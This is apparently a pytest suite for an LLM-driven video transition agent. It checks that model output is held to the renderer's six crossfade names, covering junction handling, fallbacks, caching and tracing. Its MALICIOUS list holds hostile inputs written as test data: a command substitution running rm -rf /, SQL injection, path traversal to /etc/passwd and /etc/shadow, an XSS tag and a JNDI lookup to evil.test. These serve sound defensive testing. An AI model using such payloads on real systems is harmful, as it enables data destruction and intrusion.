"""
Transition Agent.

The LLM is injected throughout - no test needs a key or a network. The
properties most of these defend:

  * the vocabulary is the six names the renderer SHIPS, and a parity test
    fails loudly if that list ever changes
  * junctions come from the Story - n beats give n-1 joins - and the model
    chooses what happens at one, never which ones exist
  * a hard cut and a per-transition length are not expressible, because the
    renderer cannot do either, and the artifact says so
  * with no model every junction gets `fade`, which the engine can execute
"""

import json
import re
import typing

import pytest
from pydantic import ValidationError

from agents.artifacts import (Animation, AnimationDirection, ContentStrategy,
                              Hook, Story, StoryBeat, Transition,
                              TransitionChoice, TransitionKind)
from agents.tools.llm_tools import LLMClient, LLMReply
from agents.transition import TransitionAgent, _engine_transitions

CALM, LIVELY = "01_calm.mp4", "02_lively.mp4"


# ------------------------------------------------------------- helpers

def trans_llm(payload, record=None):
    def transport(prompt, max_tokens, images=None):
        if record is not None:
            record.append(prompt)
        text = payload if isinstance(payload, str) else json.dumps(payload)
        return LLMReply(text=text, tokens_in=300, tokens_out=200, usd=0.003)
    return LLMClient(transport=transport)


def failing_llm(error="ConnectionError: refused"):
    def transport(prompt, max_tokens, images=None):
        return LLMReply(text="", error=error)
    return LLMClient(transport=transport)


def a_story(n=3, live=True):
    bs = [StoryBeat(index=i + 1,
                    role=("hook" if i == 0 else
                          "ending" if i == n - 1 else "develop"),
                    clip_id=LIVELY if i % 2 == 0 else CALM,
                    narrative=f"beat {i + 1}")
          for i in range(n)]
    return Story(domain="model engineering", story_type="reasoned",
                 logline="a gear train built and then run", beats=bs,
                 insufficient_signal=False, confidence=0.8, live=live)


def an_animation():
    return Animation(
        animation_type="reasoned", visual_style="close and mechanical",
        directions=[
            AnimationDirection(index=1, beat_index=1, clip_id=LIVELY,
                               treatment="fill", emphasis="subject"),
            AnimationDirection(index=2, beat_index=2, clip_id=CALM,
                               treatment="blur_pad", emphasis="context"),
            AnimationDirection(index=3, beat_index=3, clip_id=LIVELY,
                               treatment="fill", emphasis="subject")],
        insufficient_signal=False, confidence=0.8, live=True)


def a_strategy(insufficient=False):
    return ContentStrategy(
        domain="model engineering", strategy_type="reasoned",
        central_topic="a working gear train", pacing="fast",
        hook=Hook(clip_id=LIVELY),
        insufficient_signal=insufficient, confidence=0.8, live=True)


GOOD = {
    "style": "soft joins that keep the mechanism reading",
    "choices": [
        {"from_beat": 1, "to_beat": 2, "kind": "smoothleft",
         "intent": "carry the eye sideways into the explanation"},
        {"from_beat": 2, "to_beat": 3, "kind": "fadewhite",
         "intent": "lift into the payoff"},
    ],
    "unsupported_requests": [],
    "risks": ["could feel soft-edged throughout"],
    "limitations": ["only three beats"],
    "confidence": 0.8,
}


def run(ctx, tracer_span, story=None, animation=None, strategy=None,
        revision=0):
    agent = TransitionAgent()
    with tracer_span(ctx, "transition") as span:
        return agent.execute(ctx, span, story=story, animation=animation,
                             strategy=strategy, revision=revision)


@pytest.fixture
def trans_ctx(director_ctx):
    ctx, clip_set = director_ctx
    ctx.job = ctx.job.model_copy(update={
        "settings": ctx.job.settings.model_copy(
            update={"domain": "model engineering"})})
    return ctx, clip_set


# ------------------------- 1. parity with the real renderer

def test_the_literal_matches_the_renderers_shipped_default():
    """If build_video's XFADES list changes, this must notice."""
    src = open("pipeline/build_video.py", encoding="utf-8").read()
    m = re.search(r"XFADES = \(.*?else\s*(\[.*?\])", src, re.S)
    assert m, "the renderer's default XFADES list could not be found"
    shipped = sorted(set(eval(m.group(1))))
    assert sorted(typing.get_args(TransitionKind)) == shipped
    assert _engine_transitions() == shipped


def test_every_supported_name_is_a_real_ffmpeg_transition():
    """A name ffmpeg does not know would make the render fail outright."""
    import subprocess

    import os
    ff = os.environ.get("AT_FFMPEG", "ffmpeg")
    out = subprocess.run([ff, "-hide_banner", "-h", "filter=xfade"],
                         capture_output=True, text=True).stdout
    for kind in typing.get_args(TransitionKind):
        assert re.search(r"^\s+%s\s" % re.escape(kind), out, re.M), \
            f"{kind} is not a transition this ffmpeg supports"


def test_a_hard_cut_is_not_expressible_because_the_renderer_has_none():
    """The design rests on this: xfade has no 'none', and every junction
    crossfades, so 'cut' cannot be offered."""
    assert "cut" not in typing.get_args(TransitionKind)
    assert "none" not in typing.get_args(TransitionKind)
    src = open("pipeline/build_video.py", encoding="utf-8").read()
    # every junction goes through xfade - there is no branch that skips it
    assert "xfade=transition=" in src
    assert re.search(r"for i in range\(1, len\(parts\)\)", src)


def test_the_length_is_global_not_per_transition():
    src = open("pipeline/build_video.py", encoding="utf-8").read()
    assert "AT_XFADE_T" in src
    # one T, formatted into every transition in the chain
    assert "duration=%.1f" in src
    assert "duration" not in TransitionChoice.model_fields


def test_the_output_feeds_a_bridge_that_already_exists():
    from agents.artifacts import RenderSpec
    spec = RenderSpec(job_id="j", build_dir="b", src_dir="s",
                      canvas=(1920, 1080), crf=18, segments=[],
                      xfade_list=["fade", "wipeup"])
    assert spec.env_overrides()["AT_XFADES"] == "fade,wipeup"


def test_capabilities_reach_the_artifact_and_are_not_model_output(trans_ctx,
                                                                  tracer_span):
    ctx, _cs = trans_ctx
    ctx.llm = trans_llm({**GOOD, "engine_transitions": ["teleport"]})
    p = run(ctx, tracer_span, a_story()).payload
    assert p.engine_transitions == _engine_transitions()
    assert "teleport" not in p.engine_transitions


def test_the_prompt_states_what_cannot_be_asked_for(trans_ctx, tracer_span):
    ctx, _cs = trans_ctx
    seen = []
    ctx.llm = trans_llm(GOOD, record=seen)
    run(ctx, tracer_span, a_story())
    # short fragments only: the prompt wraps, so a longer phrase would
    # straddle a newline and fail for no real reason
    assert "a hard cut" in seen[0]
    assert 'there is no "none" option' in seen[0]
    assert "a different length for one transition" in seen[0]
    for k in _engine_transitions():
        assert k in seen[0]


# ------------------------------------------ 2. a valid choice set

def test_a_valid_reply_becomes_a_complete_set(trans_ctx, tracer_span):
    ctx, _cs = trans_ctx
    ctx.llm = trans_llm(GOOD)
    art = run(ctx, tracer_span, a_story(), an_animation(), a_strategy())
    p = art.payload

    assert isinstance(p, Transition)
    assert p.transition_type == "reasoned"
    assert p.style
    assert len(p.choices) == 2                 # 3 beats -> 2 junctions
    assert p.xfade_sequence == ["smoothleft", "fadewhite"]
    assert p.live is True
    assert not p.insufficient_signal
    assert art.degraded is False and art.fallback_used is None


def test_the_envelope_is_complete(trans_ctx, tracer_span):
    ctx, _cs = trans_ctx
    ctx.llm = trans_llm(GOOD)
    art = run(ctx, tracer_span, a_story(), an_animation())
    assert art.artifact_id and art.job_id == ctx.job.job_id
    assert art.kind == "Transition"
    assert art.schema_version >= 1 and art.revision == 0
    assert art.produced_by == "transition"
    assert art.produced_at > 0 and art.inputs_hash and art.trace_id
    assert 0.0 <= art.confidence <= 1.0
    assert art.cost is not None


# ------------------------------- 3. junctions come from the story

@pytest.mark.parametrize("n,expected", [(2, 1), (3, 2), (5, 4)])
def test_n_beats_give_n_minus_one_junctions(trans_ctx, tracer_span, n,
                                            expected):
    ctx, _cs = trans_ctx
    ctx.llm = trans_llm({**GOOD, "choices": []})
    p = run(ctx, tracer_span, a_story(n=n)).payload
    assert len(p.choices) == expected
    assert [(c.from_beat, c.to_beat) for c in p.choices] == \
        [(i, i + 1) for i in range(1, n)]


def test_one_beat_gives_no_junction(trans_ctx, tracer_span):
    ctx, _cs = trans_ctx
    ctx.llm = trans_llm(GOOD)
    art = run(ctx, tracer_span, a_story(n=1))
    assert art.payload.choices == []
    assert art.payload.insufficient_signal is True
    assert any("no junction" in x for x in art.payload.limitations)


def test_a_single_beat_never_calls_the_model(trans_ctx, tracer_span):
    calls = []
    ctx, _cs = trans_ctx
    ctx.llm = trans_llm(GOOD, record=calls)
    run(ctx, tracer_span, a_story(n=1))
    assert calls == [], "there is nothing to decide, so no call is worth it"


@pytest.mark.parametrize("pair", [(1, 3), (3, 1), (9, 10), (0, 1), (2, 2)])
def test_a_choice_naming_a_junction_that_does_not_exist_is_dropped(
        trans_ctx, tracer_span, pair):
    ctx, _cs = trans_ctx
    fb, tb = pair
    ctx.llm = trans_llm({**GOOD, "choices": [
        {"from_beat": fb, "to_beat": tb, "kind": "wipeup"}]})
    p = run(ctx, tracer_span, a_story()).payload
    assert [(c.from_beat, c.to_beat) for c in p.choices] == [(1, 2), (2, 3)]
    assert all(c.kind == "fade" for c in p.choices)
    assert any("does not exist" in x for x in p.limitations)


@pytest.mark.parametrize("bad", ["1", 1.5, True, None, {"a": 1}])
def test_a_non_integer_beat_reference_is_dropped(trans_ctx, tracer_span, bad):
    ctx, _cs = trans_ctx
    ctx.llm = trans_llm({**GOOD, "choices": [
        {"from_beat": bad, "to_beat": 2, "kind": "wipeup"}]})
    p = run(ctx, tracer_span, a_story()).payload
    assert all(c.kind == "fade" for c in p.choices)


def test_a_skipped_junction_still_gets_a_transition(trans_ctx, tracer_span):
    """The renderer crossfades it regardless, so silence would be a lie."""
    ctx, _cs = trans_ctx
    ctx.llm = trans_llm({**GOOD, "choices": [
        {"from_beat": 1, "to_beat": 2, "kind": "wipeup"}]})
    p = run(ctx, tracer_span, a_story()).payload
    assert len(p.choices) == 2
    assert p.xfade_sequence == ["wipeup", "fade"]
    assert any("default to fade" in x for x in p.limitations)


def test_a_duplicate_choice_for_a_junction_keeps_the_first(trans_ctx,
                                                           tracer_span):
    ctx, _cs = trans_ctx
    ctx.llm = trans_llm({**GOOD, "choices": [
        {"from_beat": 1, "to_beat": 2, "kind": "wipeup"},
        {"from_beat": 1, "to_beat": 2, "kind": "smoothup"}]})
    p = run(ctx, tracer_span, a_story()).payload
    assert p.choices[0].kind == "wipeup"


def test_choices_are_in_story_order_and_contiguous(trans_ctx, tracer_span):
    ctx, _cs = trans_ctx
    ctx.llm = trans_llm({**GOOD, "choices": [
        {"from_beat": 2, "to_beat": 3, "kind": "wipeup"},
        {"from_beat": 1, "to_beat": 2, "kind": "smoothup"}]})
    p = run(ctx, tracer_span, a_story()).payload
    assert [(c.from_beat, c.to_beat) for c in p.choices] == [(1, 2), (2, 3)]
    assert [c.index for c in p.choices] == [1, 2]
    assert p.xfade_sequence == ["smoothup", "wipeup"]


# ------------------------- 4. unsupported handling

@pytest.mark.parametrize("kind", ["cut", "none", "circleopen", "pixelize",
                                  "CUT", "fade ", "", None, 7])
def test_an_unsupported_transition_name_falls_back_and_is_flagged(
        trans_ctx, tracer_span, kind):
    ctx, _cs = trans_ctx
    ctx.llm = trans_llm({**GOOD, "choices": [
        {"from_beat": 1, "to_beat": 2, "kind": kind}]})
    p = run(ctx, tracer_span, a_story()).payload
    assert p.choices[0].kind == "fade"
    assert p.choices[0].supported is False
    assert any("does not have" in x for x in p.limitations)


def test_an_intent_asking_for_a_hard_cut_is_marked_unsupported(trans_ctx,
                                                               tracer_span):
    ctx, _cs = trans_ctx
    ctx.llm = trans_llm({**GOOD, "choices": [
        {"from_beat": 1, "to_beat": 2, "kind": "fade",
         "intent": "really this should be a hard cut"}]})
    p = run(ctx, tracer_span, a_story()).payload
    assert p.choices[0].supported is False
    assert p.supported_choices and len(p.supported_choices) < len(p.choices)


def test_a_style_asking_for_the_impossible_is_recorded(trans_ctx,
                                                       tracer_span):
    ctx, _cs = trans_ctx
    ctx.llm = trans_llm({**GOOD, "style": "hard cuts throughout, no fades"})
    p = run(ctx, tracer_span, a_story()).payload
    assert p.unsupported_requests
    assert any("cannot do" in x for x in p.unsupported_requests)


def test_an_explicit_unsupported_request_is_kept(trans_ctx, tracer_span):
    ctx, _cs = trans_ctx
    ctx.llm = trans_llm({**GOOD,
                         "unsupported_requests": ["a 0.1s snap on beat 2"]})
    p = run(ctx, tracer_span, a_story()).payload
    assert "a 0.1s snap on beat 2" in p.unsupported_requests
    assert any("will not happen" in x for x in p.limitations)


def test_the_global_length_limitation_is_always_stated(trans_ctx,
                                                       tracer_span):
    ctx, _cs = trans_ctx
    ctx.llm = trans_llm(GOOD)
    p = run(ctx, tracer_span, a_story()).payload
    assert any("global length" in x for x in p.limitations)


# ------------------- 5. timestamp / duration / path rejection

def test_the_schema_makes_timing_and_paths_impossible():
    for bad in ({"duration": 0.4}, {"start": 1.0}, {"end": 2.0},
                {"offset": 3.0}, {"seconds": 4}, {"filter": "xfade=x"},
                {"clip_id": "a.mp4"}, {"path": "x"}):
        with pytest.raises(ValidationError):
            TransitionChoice(index=1, from_beat=1, to_beat=2, **bad)
    for bad in ({"xfade_duration": 0.4}, {"total_duration": 30.0},
                {"ffmpeg": "-vf x"}):
        with pytest.raises(ValidationError):
            Transition(**bad)


def test_no_field_can_hold_a_time_or_a_path():
    banned = {"start", "end", "duration", "offset", "seconds", "at",
              "xfade_duration", "total_duration", "path", "file_path",
              "clip_id", "filter", "ffmpeg"}
    for model in (Transition, TransitionChoice):
        assert not (set(model.model_fields) & banned), model.__name__


def test_a_model_sending_durations_is_ignored(trans_ctx, tracer_span):
    ctx, _cs = trans_ctx
    ctx.llm = trans_llm({**GOOD, "xfade_duration": 1.5, "choices": [
        {"from_beat": 1, "to_beat": 2, "kind": "wipeup",
         "duration": 0.9, "offset": 3.2, "clip_id": "99.mp4"}]})
    art = run(ctx, tracer_span, a_story())
    dumped = json.dumps(art.payload.model_dump())
    assert "0.9" not in dumped and "3.2" not in dumped and "1.5" not in dumped
    assert '"duration"' not in dumped and '"clip_id"' not in dumped
    assert art.payload.choices[0].kind == "wipeup"


def test_choice_indices_must_be_contiguous():
    with pytest.raises(ValidationError):
        Transition(choices=[
            TransitionChoice(index=1, from_beat=1, to_beat=2),
            TransitionChoice(index=3, from_beat=2, to_beat=3)])


# -------------------------------------- 6. malformed / invalid

@pytest.mark.parametrize("junk", ["not json", "", "[1,2,3]", '{"style": '])
def test_malformed_replies_fall_back(trans_ctx, tracer_span, junk):
    ctx, _cs = trans_ctx
    ctx.llm = trans_llm(junk)
    art = run(ctx, tracer_span, a_story())
    assert art.degraded is True
    assert art.fallback_used and "deterministic" in art.fallback_used
    assert isinstance(art.payload, Transition)


def test_a_failed_call_falls_back(trans_ctx, tracer_span):
    ctx, _cs = trans_ctx
    ctx.llm = failing_llm()
    art = run(ctx, tracer_span, a_story())
    assert art.degraded is True and art.payload.live is False


def test_junk_types_are_survived(trans_ctx, tracer_span):
    ctx, _cs = trans_ctx
    ctx.llm = trans_llm({"style": True, "choices": "not a list",
                         "unsupported_requests": 5, "risks": None,
                         "limitations": {"a": 1}, "confidence": "high"})
    p = run(ctx, tracer_span, a_story()).payload
    assert p.style == "", "a bool must not become text"
    assert p.unsupported_requests == []
    assert p.confidence == 0.0
    # junctions still exist, because they come from the story
    assert len(p.choices) == 2


@pytest.mark.parametrize("bad", [5.0, -3, float("nan"), float("inf"), "x",
                                 None])
def test_confidence_is_always_in_range(trans_ctx, tracer_span, bad):
    ctx, _cs = trans_ctx
    ctx.llm = trans_llm({**GOOD, "confidence": bad})
    art = run(ctx, tracer_span, a_story())
    assert 0.0 <= art.payload.confidence <= 1.0
    assert 0.0 <= art.confidence <= 1.0


def test_lists_are_bounded(trans_ctx, tracer_span):
    ctx, _cs = trans_ctx
    huge = "A" * 5000
    ctx.llm = trans_llm({**GOOD, "style": huge,
                         "unsupported_requests": [huge] * 50})
    p = run(ctx, tracer_span, a_story()).payload
    assert len(p.style) <= 300
    assert len(p.unsupported_requests) <= 8


MALICIOUS = [
    "$(rm -rf /)", "; DROP TABLE artifacts; --", "../../../../etc/passwd",
    "C:\\Windows\\System32\\cmd.exe", "xfade=transition=fade:duration=99",
    "' OR '1'='1", "<script>alert(1)</script>", "file:///etc/shadow",
    "\x00truncated", "${jndi:ldap://evil.test/x}",
]


@pytest.mark.parametrize("payload", MALICIOUS)
def test_a_malicious_string_stays_inert_data(trans_ctx, tracer_span, payload):
    ctx, _cs = trans_ctx
    ctx.llm = trans_llm({**GOOD, "style": payload, "choices": [
        {"from_beat": 1, "to_beat": 2, "kind": payload, "intent": payload}]})
    p = run(ctx, tracer_span, a_story()).payload
    # a malicious "kind" can never survive - it is not in the vocabulary
    assert all(c.kind in typing.get_args(TransitionKind) for c in p.choices)
    again = Transition.model_validate_json(p.model_dump_json())
    assert isinstance(again.style, str)
    assert all(c.kind in typing.get_args(TransitionKind)
               for c in again.choices)


@pytest.mark.parametrize("payload", MALICIOUS)
def test_the_xfade_sequence_is_always_renderer_safe(trans_ctx, tracer_span,
                                                    payload):
    """Whatever comes back, AT_XFADES can only ever get valid names."""
    ctx, _cs = trans_ctx
    ctx.llm = trans_llm({**GOOD, "choices": [
        {"from_beat": 1, "to_beat": 2, "kind": payload}]})
    p = run(ctx, tracer_span, a_story()).payload
    for name in p.xfade_sequence:
        assert name in _engine_transitions()


# ------------------------------------------ 7. fallback behaviour

def test_with_no_api_key_every_junction_gets_a_real_transition(trans_ctx,
                                                               tracer_span):
    ctx, _cs = trans_ctx
    ctx.llm = LLMClient()
    assert not ctx.llm.available()

    art = run(ctx, tracer_span, a_story(), an_animation())
    p = art.payload

    assert art.degraded is True
    assert art.fallback_used and "deterministic" in art.fallback_used
    assert p.live is False and p.model is None
    assert p.xfade_sequence == ["fade", "fade"]
    assert all(k in _engine_transitions() for k in p.xfade_sequence)
    assert p.confidence == 0.0
    assert p.insufficient_signal is True


def test_the_fallback_invents_nothing(trans_ctx, tracer_span):
    ctx, _cs = trans_ctx
    ctx.llm = LLMClient()
    p = run(ctx, tracer_span, a_story()).payload
    assert p.style == "", "a fallback must not invent a feel"
    assert all(c.intent == "" for c in p.choices)
    assert p.unsupported_requests == []
    assert any("no transition was chosen for its effect" in x
               for x in p.limitations)


def test_the_fallback_still_covers_every_junction(trans_ctx, tracer_span):
    ctx, _cs = trans_ctx
    ctx.llm = LLMClient()
    p = run(ctx, tracer_span, a_story(n=5)).payload
    assert len(p.choices) == 4
    assert [(c.from_beat, c.to_beat) for c in p.choices] == \
        [(1, 2), (2, 3), (3, 4), (4, 5)]


def test_no_story_produces_a_minimal_artifact(trans_ctx, tracer_span):
    ctx, _cs = trans_ctx
    ctx.llm = trans_llm(GOOD)
    art = run(ctx, tracer_span, None)
    assert art.payload.choices == []
    assert art.payload.story_available is False
    assert art.payload.transition_type == "minimal"


def test_no_animation_caps_confidence_and_is_stated(trans_ctx, tracer_span):
    ctx, _cs = trans_ctx
    ctx.llm = trans_llm({**GOOD, "confidence": 1.0})
    p = run(ctx, tracer_span, a_story(), None).payload
    assert p.animation_available is False
    assert p.confidence <= 0.7
    assert any("not informed by how each beat is framed" in x
               for x in p.limitations)


# ---------------------------------------------- 8. cache behaviour

def test_identical_inputs_hit_the_cache(trans_ctx, tracer_span):
    ctx, _cs = trans_ctx
    calls = []
    ctx.llm = trans_llm(GOOD, record=calls)
    st, an, cs = a_story(), an_animation(), a_strategy()
    first = run(ctx, tracer_span, st, an, cs, revision=0)
    second = run(ctx, tracer_span, st, an, cs, revision=1)
    assert second.artifact_id == first.artifact_id
    assert second.revision == 0
    assert len(calls) == 1


def test_the_cache_invalidates_when_the_story_changes(trans_ctx, tracer_span):
    ctx, _cs = trans_ctx
    calls = []
    ctx.llm = trans_llm(GOOD, record=calls)
    first = run(ctx, tracer_span, a_story(), revision=0)
    second = run(ctx, tracer_span, a_story(n=4), revision=1)
    assert second.inputs_hash != first.inputs_hash
    assert len(calls) == 2


def test_the_cache_invalidates_when_the_look_changes(trans_ctx, tracer_span):
    ctx, _cs = trans_ctx
    ctx.llm = trans_llm(GOOD)
    st = a_story()
    first = run(ctx, tracer_span, st, an_animation(), revision=0)
    changed = an_animation().model_copy(
        update={"visual_style": "something else entirely"})
    second = run(ctx, tracer_span, st, changed, revision=1)
    assert second.inputs_hash != first.inputs_hash


def test_the_cache_invalidates_when_the_strategy_changes(trans_ctx,
                                                         tracer_span):
    ctx, _cs = trans_ctx
    ctx.llm = trans_llm(GOOD)
    st = a_story()
    first = run(ctx, tracer_span, st, None, a_strategy(), revision=0)
    changed = a_strategy().model_copy(update={"pacing": "slow"})
    second = run(ctx, tracer_span, st, None, changed, revision=1)
    assert second.inputs_hash != first.inputs_hash


def test_the_cache_is_not_time_based(trans_ctx, tracer_span):
    import time as _t
    ctx, _cs = trans_ctx
    ctx.llm = trans_llm(GOOD)
    agent = TransitionAgent()
    st = a_story()
    with tracer_span(ctx, "transition") as span:
        a = agent.execute(ctx, span, story=st, revision=0)
    _t.sleep(1.1)
    with tracer_span(ctx, "transition") as span:
        b = agent.execute(ctx, span, story=st, revision=1)
    assert a.inputs_hash == b.inputs_hash


# --------------------------------------- 9. trace + decisions

def test_the_trace_id_reaches_the_artifact(trans_ctx, tracer_span):
    ctx, _cs = trans_ctx
    ctx.llm = trans_llm(GOOD)
    agent = TransitionAgent()
    with tracer_span(ctx, "transition") as span:
        art = agent.execute(ctx, span, story=a_story())
        assert art.trace_id == span.trace_id
    rows = [r for r in ctx.tracer.for_job(ctx.job.job_id)
            if r["node"] == "transition"]
    assert rows and art.artifact_id in rows[-1]["output_artifacts"]


def test_the_llm_call_is_recorded_in_the_trace(trans_ctx, tracer_span):
    ctx, _cs = trans_ctx
    ctx.llm = trans_llm(GOOD)
    run(ctx, tracer_span, a_story())
    rows = [r for r in ctx.tracer.for_job(ctx.job.job_id)
            if r["node"] == "transition"]
    tools = [t["tool"] for r in rows for t in r["tool_calls"]]
    assert "llm.complete_json" in tools
    assert rows[-1]["tokens_in"] == 300 and rows[-1]["tokens_out"] == 200


def test_the_fallback_is_recorded_in_the_trace(trans_ctx, tracer_span):
    ctx, _cs = trans_ctx
    ctx.llm = LLMClient()
    run(ctx, tracer_span, a_story())
    rows = [r for r in ctx.tracer.for_job(ctx.job.job_id)
            if r["node"] == "transition"]
    assert rows[-1]["fallback_used"]


def test_decisions_use_the_existing_closed_enum(trans_ctx, tracer_span):
    ctx, _cs = trans_ctx
    ctx.llm = trans_llm(GOOD)
    art = run(ctx, tracer_span, a_story(), an_animation(), a_strategy())
    assert art.decisions
    allowed = {"llm", "measurement", "policy", "human", "fallback"}
    for d in art.decisions:
        assert d.what and d.chose and d.why
        assert d.decided_by in allowed, "the closed enum must not be widened"
        assert 0.0 <= d.confidence <= 1.0
    whats = {d.what for d in art.decisions}
    assert "Evidence the transitions were chosen from" in whats
    assert "What the renderer can do" in whats
    assert "Junctions" in whats


def test_junctions_are_attributed_to_measurement(trans_ctx, tracer_span):
    ctx, _cs = trans_ctx
    ctx.llm = trans_llm(GOOD)
    art = run(ctx, tracer_span, a_story())
    d = next(d for d in art.decisions if d.what == "Junctions")
    assert d.decided_by == "measurement", "junctions are derived, not chosen"


def test_the_fallback_attributes_nothing_to_an_llm(trans_ctx, tracer_span):
    ctx, _cs = trans_ctx
    ctx.llm = LLMClient()
    art = run(ctx, tracer_span, a_story())
    kinds = {d.decided_by for d in art.decisions}
    assert "fallback" in kinds
    assert "llm" not in kinds


# ------------------------ 10. the joins reach the edit

def test_the_director_receives_the_joins(trans_ctx, tracer_span):
    from agents.editing_director import EditingDirectorAgent

    ctx, clip_set = trans_ctx
    ctx.llm = trans_llm(GOOD)
    trans = run(ctx, tracer_span, a_story(), an_animation()).payload

    seen = []
    ctx.llm = trans_llm({"strategy": "s", "opening_rationale": "r",
                         "segments": [{"clip_id": LIVELY,
                                       "target_seconds": 4.0, "reason": "x"}],
                         "rejected": []}, record=seen)
    with tracer_span(ctx, "editing_director") as span:
        EditingDirectorAgent().execute(ctx, span, clip_set=clip_set,
                                       transition=trans, revision=0)

    prompt = seen[0]
    assert "THE JOINS" in prompt
    assert "smoothleft" in prompt
    assert "one global length" in prompt
    assert "You do NOT choose timestamps" in prompt


def test_a_changed_join_set_invalidates_the_edit_plan_cache(trans_ctx,
                                                            tracer_span):
    from agents.editing_director import EditingDirectorAgent

    ctx, clip_set = trans_ctx
    ctx.llm = LLMClient()
    agent = EditingDirectorAgent()
    one = Transition(choices=[TransitionChoice(index=1, from_beat=1,
                                               to_beat=2, kind="fade")])
    two = Transition(choices=[TransitionChoice(index=1, from_beat=1,
                                               to_beat=2, kind="wipeup")])
    with tracer_span(ctx, "editing_director") as span:
        a = agent.execute(ctx, span, clip_set=clip_set, transition=one,
                          revision=0)
    with tracer_span(ctx, "editing_director") as span:
        b = agent.execute(ctx, span, clip_set=clip_set, transition=two,
                          revision=1)
    assert a.inputs_hash != b.inputs_hash


def test_the_director_records_that_it_acted_on_the_joins(trans_ctx,
                                                         tracer_span):
    from agents.editing_director import EditingDirectorAgent

    ctx, clip_set = trans_ctx
    ctx.llm = LLMClient()
    trans = Transition(live=True, confidence=0.8, choices=[
        TransitionChoice(index=1, from_beat=1, to_beat=2, kind="wipeup")])
    with tracer_span(ctx, "editing_director") as span:
        art = EditingDirectorAgent().execute(ctx, span, clip_set=clip_set,
                                             transition=trans, revision=0)
    d = next(d for d in art.decisions
             if d.what == "Join brief from the Transition agent")
    assert "wipeup" in d.chose
    assert d.decided_by == "policy"


def test_the_director_works_with_no_joins(trans_ctx, tracer_span):
    from agents.editing_director import EditingDirectorAgent

    ctx, clip_set = trans_ctx
    ctx.llm = LLMClient()
    with tracer_span(ctx, "editing_director") as span:
        art = EditingDirectorAgent().execute(ctx, span, clip_set=clip_set,
                                             transition=None, revision=0)
    assert art.payload.segments
    assert not any(d.what == "Join brief from the Transition agent"
                   for d in art.decisions)


# ------------------------------------------ helpers on the model

def test_choice_helpers():
    t = Transition(choices=[
        TransitionChoice(index=1, from_beat=1, to_beat=2, kind="fade"),
        TransitionChoice(index=2, from_beat=2, to_beat=3, kind="wipeup",
                         supported=False)])
    assert t.xfade_sequence == ["fade", "wipeup"]
    assert [c.index for c in t.supported_choices] == [1]
    assert t.choice_between(2, 3).kind == "wipeup"
    assert t.choice_between(1, 3) is None
